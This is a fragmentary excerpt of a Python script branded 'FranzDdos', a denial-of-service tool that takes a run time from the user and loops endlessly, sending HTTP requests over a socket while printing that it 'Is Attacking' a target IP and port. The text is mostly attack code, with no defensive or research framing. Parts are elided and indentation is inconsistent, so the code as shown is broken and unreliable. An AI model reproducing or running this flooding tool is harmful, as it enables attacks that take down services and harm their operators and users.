...
if sys.platform.startswith("linux"):
   ...
   os.system('clear')
    ...
    os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title FranzDdos-V1")
...
times = int(input("Time (Your choice) : "))
...
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title FranzDDOS - V2")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    ...
    while True:
        try:
            ...
            for x in range(times):
                ...
                s.sendall(str.encode(request))
                s.sendall(str.encode(request))
            print(f"[System] pushy Is Attacking (IP) (PORT) [System]")
        except socket.error:
            s.close()
            print(f"[System] pushy Is Attacking (IP) (PORT) [System] ")
            print(f"[System] pushy Is Attacking (IP) (PORT) [System]")
